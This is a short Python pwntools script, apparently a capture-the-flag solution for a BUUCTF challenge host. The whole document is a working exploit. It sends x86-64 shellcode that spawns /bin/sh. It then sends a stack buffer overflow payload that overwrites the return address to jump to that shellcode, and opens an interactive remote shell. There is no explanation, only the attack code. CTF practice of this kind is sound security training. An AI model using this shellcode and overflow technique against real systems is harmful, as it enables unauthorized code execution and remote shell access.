from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27593)
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
io.sendlineafter(b'Hello my friend.Any gift for me?\n', shellcode)
payload = b'a'*(0x30+0x8) + p64(0x233000)
io.sendlineafter(b'Anything else?\n', payload)
io.interactive()